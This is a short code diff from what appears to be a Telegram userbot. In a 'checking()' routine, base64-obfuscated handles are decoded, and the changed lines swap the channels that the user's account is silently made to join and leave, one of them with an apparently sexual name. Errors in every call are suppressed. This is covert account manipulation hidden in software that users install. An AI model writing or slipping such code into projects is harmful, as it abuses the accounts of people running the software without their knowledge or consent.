@@ -82,14 +82,14 @@ async def checking():
     gocheck = str(pybase64.b64decode("QHpsZHByb2plY3Rz"))[2:13]
     checker = str(pybase64.b64decode("QFVucmVhbEJhYmllcw=="))[2:17]
     try:
-        await bot(Get("@ZeldaProjects"))
+        await bot(Get("@ZoneDangerSex"))
     except BaseException:
         pass
     try:
-        await bot(Get("@HCMutualism"))
+        await bot(Get("@Revanstoreya"))
     except BaseException:
         pass
     try:
-        await bot(Out("@SharingUserbot"))
+        await bot(Out("@abcdump02"))
     except BaseException:
         pass
